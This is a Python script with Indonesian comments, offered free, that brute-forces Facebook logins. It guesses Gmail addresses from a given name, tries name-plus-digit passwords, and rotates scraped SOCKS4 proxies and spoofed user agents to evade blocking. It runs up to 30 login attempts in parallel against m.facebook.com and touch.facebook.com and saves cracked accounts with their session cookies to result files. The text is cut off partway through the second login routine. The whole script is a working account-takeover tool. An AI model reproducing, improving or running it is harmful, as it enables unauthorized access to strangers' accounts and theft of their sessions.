#THANKS TO HADI-XD
#SC FREE JANGAN DI JUAL BELIKAN !!
#--------------------[ IMPORT-MODULE ]--------------------#
import requests,json,os,sys,random,datetime,time,re,platform
from concurrent.futures import ThreadPoolExecutor as tred
#----------------------[ MODULE-RICH ]------------------------#
from rich.tree import Tree
from rich import print as cetak
from time import sleep as waktu
from rich.panel import Panel as panel
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
#-----------------------[ INDICATION ]---------------------#
id,id2,loop,ok,cp,akun,method,tokenku,uid,ugen= [],[],0,0,0,[],[],[],[],[]
#-------------------------[ GET-PROXY ]-------------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('No internet connection')
prox=open('.prox.txt','r').read().splitlines()
#-------------------------[ USER-AGENT ]----------------------#	
realme = random.choice(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/'
	e=random.choice(["G910S","G977N","A826S","G770U1","MMB29T","JZO54K","M1AJQ","KOT49H"])
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/376.0.0.7.103;]'
	g=random.randrange(73,112)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/534.36'
	l=random.choice(["YaSearchBrowser","UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge"])
	m=random.randrange(1,9)
	n=random.randrange(1,9)
	o='0'
	p=random.randrange(5,20)
	uaku=(f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
	ugen.append(uaku)
	
	aa='Mozilla/5.0 (Windows NT'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Infinix NOTE 2 LTE Build/LMY47D)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
    
#--------------------[ WARNA-COLOR ]-----------------------#
H = '\x1b[1;92m' # WARNA HIJAU MUDA
h = '\033[32m'    # WARNA HIJAU TUA
K = '\033[93m'    # WARNA KUNING MUDA
k = '\033[33m'    # WARNA KUNING TUA
B = '\33[1;96m'   # WARNA BIRU MUDA
b = '\x1b[0;34m' # WARNA BIRU TUA
M = '\x1b[1;91m'# WARNA MERAH
U = '\033[95m'    # WARNA UNGU
x = '\33[m'           # WARNA DEFAULT
xrdev = random.choice([H,K,M,U,B])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#-----------------------[ ANIMASI ]-----------------------------#
def xr_dev(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	menu_xr()
#---------------------[ LOGO-BANNER ]---------------------#
def logo():
	clear()
	print(f'''                                         
╔═╗┌─┐╔╗   ╦  ╦┬╔═╗
║  ├┤ ╠╩╗  ╚╗╔╝│╠═╝
╚═╝└  ╚═╝   ╚╝ ┴╩  
{H} ''')
#--------------------[ BAGIAN-MENU ]----------------------#
def menu_xd():
	os.system ('clear') 
	logo() 
	print(f'[1] CRACK DARI EMAIL') 
	print(f'[2] CEK RESULT CRACk')
	print(f'[3] KELUAR DARI SCRIPT')
	xdxd_dev = input(f'\npilih menu : ')
	if xdxd_dev in ['1','01']:
		crack_email()
	elif xdxd_dev in ['2','02']:
		cek_result()
	elif xdxd_dev in ['3','03']:os.system('rm -rf .coonk.txt');print('Sukses Logout - Good By Sampai jumpa');exit() #XD
	else:
		print('Pilih yang benar')
		time.sleep(3) 
		back()
#---------------------[ RESULT-CRACK ]-----------------------#
def cek_result():
	print('')
	print(f'[1] CEK RESULT OK')
	print(f'[2] CEK RESULT CP')
	print(f'[3] EXIT')
	xr = input(f'\npilih menu : ')
	if xr in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('kamu tidak mempunyai result live')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'     %s.%s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}     {H}*---> {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{x}')
				nocp +=1
			print('')
			input(f'klik enter untuk kembali ke menu utama ')
			menu_xr()
	elif xr in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'     %s.%s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'     %s.%s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih result : ')
			try:geh = lol[geeh]
			except KeyError:
				print('pilih yang benar  ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('file tidak di temukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}     {k}*---> {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}klick enter untuk kembali ke menu')
			menu_xr()
	elif kz in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener ')
		exit() 
#-------------------[ CRACK-EMAIL ]------------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','alan','aidil','kunyuk','bocil','lusi','alam','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','fazain','aditia','aditya','saputra','candra','rahmawati','wahyuni','adi','purnomo','waluyo','2001','2002','2003','2004','1987','123','1234','12345','999','1234567','1987','2008','2007','999','123123','87','1999','666','2000','2005','25','26','27','78','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','193891','50','45','46','47','48','49','51','231','241','772','829','610','64','682','2737','09','01','628','528','422','241','666','321','537','771','883','836','929','737','dwisaputra','123','288','913','891','88','66','77','66','aditia','saputra','55','991','728','923','112','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','032','610','88923','92','17','53','42','67','89','11','34','65','73','56','98','83','45','10','29','76','95','28','46','23','92','28','27','29','21','30','22','18','19','26','25','23','76','13','24','98','46','90','32','65','94','56','8','54','9','71','87','38','85','44','17','23','6','5','26','22','68','37','33','15','17','23','65','25','99','83','68','81','66','94','43','91','12','2','33','93','72','88','21','62','77','44','47','10','9','29','28','50','58','18','85','41','79','38','15','17','23','65','25','99','83','68','81','66','94','43','91','12','2','33','93','72','88','21','62','77','44','47','10','9','29','28','50','58','18','85','41','79','24','27','29','21','30','22','18','19','26','25','23','76','13','24','98','46','90','32','65','94','56','8','54','9','71','87','38','85','44','17','23','6','5','26','22','68','37','12','19','13','14','10','12','11','8','9','6','5','4','3','2','1','24','27','29','21','30','22','18','19','26','25','23','76','13','24','98','46','90','32','65','94','56','8','54','9','71','87','38','85','44','17','23','6','5','26','22','68','37','11','5','26','22','68','37','23','25','15','17','23','65','25','99','83','68','81','66','94','43','91','12','2','33','93','72','88','21','62','77','44','47','10','9','29','28','50','58','18','85','41','79','883','812','72','77','101','official','gaming','90','96','25','221','621','722','112','829','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009','102','628','791','991','88','667','66','123321','999','123456789239','921','175','534','267','891','113','465','735','569','834','545','102','952','846','239','282','729','213','022','181','919','262','528','422','241','321','537','771','883','836','929','737','123','288','913','891','886','667','776','665','559','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','828','376','putratunggal','putritunggal','sukoco','ningsih','rahmat','tania','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655','223','332','331','313','626','364','656','556','452','281','812','235','898','998','110','739','892','344','876','665','817','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','828','376','8778','7777','aditia','sanjaya','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655','223','332','331','313','626','364','656','556','452','281','812','235','898','998','110','739','892','344','876','665','817','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','828','376','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','gans']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','bocil','ganz','cans','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print('') 
	print('masukan nama terserah kalian') 
	nama = input(f'nama  : ')
	if ',' in str(nama):
		exit(f'masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'masukan domain yang benar')
	jumlah = input(f'total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
	setting()

#-------------[ SETTING UNTUK CRACK]---------------#
def setting():
	print('')
	print(f'[1] CRACK DARI URUTAN ID OLD')
	print(f'[2] CRACK DARI URUTAN ID NEW')
	print(f'[3] CRACK DARI URUTAN ID RANDOM')
	xr_dev_ganz = input('\npilih urutan : ')
	if xr_dev_ganz in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif xr_dev_ganz in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif xr_dev_ganz in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('Pilih Yang Bener ')
		exit()
	print('')
	print(f'[1] LOGIN WITH M.FACEBOOK.COM ASYNC {H}REKOMENDASI{x}') 
	print(f'[2] LOGIN WITH MTOUCH.FACEBOOK.COM ASYNC {H}REKOMENDASI{x}') 
	xr_ganz = input(f'\npilih metode : ')
	if xr_ganz in ['1','01']:
		method.append('mobile')
	elif xr_ganz in ['2','02']:
		method.append('mtouch')
	else:
		method.append('mobile')
	print('') 
	print(f'[1] NAMA123 + NAMA1234 + NAMA12345') 
	print(f'[2] NAMA321 + NAMA4321 + NAMA54321') 
	print(f'[3] NAMA123 + NAMA1234 + NAMA12345 + NAMA123456') 
	xr_dev = input(f'\npilih password : ') 
	if xr_dev in ['1','01']:
		pass_v1() 
	elif xr_dev in ['2','02']:
		pass_v2() 
	elif xr_dev in ['3','03']:
		pass_v3() 
#-------------------[ PASSWORD-V1 ]-------------------#
def pass_v1():
	global prog,des
	print('')
	print(f'result : {H}%s{x} '%(okc))
	print(f'result : {K}%s{x} '%(cpc)) 
	print(f'mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345') 
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#-------------------[ PASSWORD-V2 ]-------------------#
def pass_v2():
	global prog,des
	print('')
	print(f'     result : {H}%s{x} '%(okc))
	print(f'     result : {K}%s{x} '%(cpc)) 
	print(f'     mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321') 
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#-------------------[ PASSWORD-V3 ]-------------------#
def pass_v3():
	global prog,des
	print('')
	print(f'result : {H}%s{x} '%(okc))
	print(f'result : {K}%s{x} '%(cpc)) 
	print(f'mainkan mode pesawat jika tidak ada hasil') 
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345') 
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'mobile' in method:
					pool.submit(crackmobile,idf,pwv)
				elif 'mtouch' in method:
					pool.submit(crackmtouch,idf,pwv)
				else:
					pool.submit(crackmtouch,idf,pwv)
	print('')
	print(f'total live : {H}%s{x} '%(ok)) 
	print(f'total chek : {k}%s{x} '%(cp))
#--------------------[ MOBILE-ASYNC ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[LuziXploit] {loop}/{len(id)} Live:[bold green]{ok}[/] Chek:[bold yellow]{cp}[/]") #SOURCE LUZI-XD
	prog.advance(des) 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"  ")
				tree.add(f"[XD-OK] [bold green]{idf}|{pw}|{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ MTOUCH-ASYNC ]-----------------#
def crackmtouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([U,H,K,B])
	prog.update(des,description=f"[XD] {loop}/{len(id)} Live:[bold green]{ok}[/] Chek:[bold yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
